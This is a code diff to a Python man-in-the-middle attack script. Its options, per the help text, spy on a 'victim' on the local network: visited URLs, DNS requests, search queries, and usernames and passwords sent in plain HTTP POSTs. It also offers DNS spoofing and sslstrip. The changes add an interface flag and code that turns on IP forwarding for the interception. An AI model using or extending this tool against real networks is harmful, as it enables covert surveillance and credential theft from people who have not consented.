@@ -24,12 +24,13 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -uv to print all URLs and without truncation.", action="store_true")
 parser.add_argument("-d", "--dnsspy", help="Show all DNS resquests the victim makes. This has the advantage of showing HTTPS domains which the -u option will not but does not show the full URL the victim is requesting.", action="store_true")
 parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning.")
-parser.add_argument("-i", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
+parser.add_argument("-dn", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
 parser.add_argument("-ssl", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
 parser.add_argument("-uv", "--verboseURL", help="Shows all URLs the victim visits", action="store_true")
 parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
 parser.add_argument("-p", "--post", help="Print the URL the victim POSTs to, show usernames and passwords in unsecure HTTP POSTs", action="store_true")
 parser.add_argument("-s", "--search", help="Print victim's search queries", action="store_true")
+parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`")
 args = parser.parse_args()
 
 # /dev/null, send output from programs so they don't print to screen.
@@ -40,7 +41,10 @@ ipr = ipr.communicate()[0]
 routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w[a-zA-Z0-9]\w[a-zA-Z0-9][0-9]?)', ipr)
 routerIP = routerRE.group(1)
 IPprefix = routerRE.group(2)
-interface = routerRE.group(3)
+if args.interface:
+	interface = args.interface
+else:
+	interface = routerRE.group(3)
 localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
 localMAC = get_if_hwaddr(interface)
 
@@ -275,6 +279,14 @@ except:
 	sys.exit("Could not get MAC addresses")
 
 #Forward packets and flush iptables
+#ADD THIS SOON *********************
+##if not getoutput('cat /proc/sys/net/ipv4/ip_forward') == '1':
+#	Msg('IPv4 forwarding disabled. Enabling..')
+#	tmp = getoutput('sudo sh -c \'echo "1" > /proc/sys/net/ipv4/ip_forward\'')
+#	if len(tmp) > 0:
+#		Error('Error enabling IPv4 forwarding.')
+#		sys.exit(1)
+
 f = open('/proc/sys/net/ipv4/ip_forward', 'r+')
 f.write('1')
 f.close()
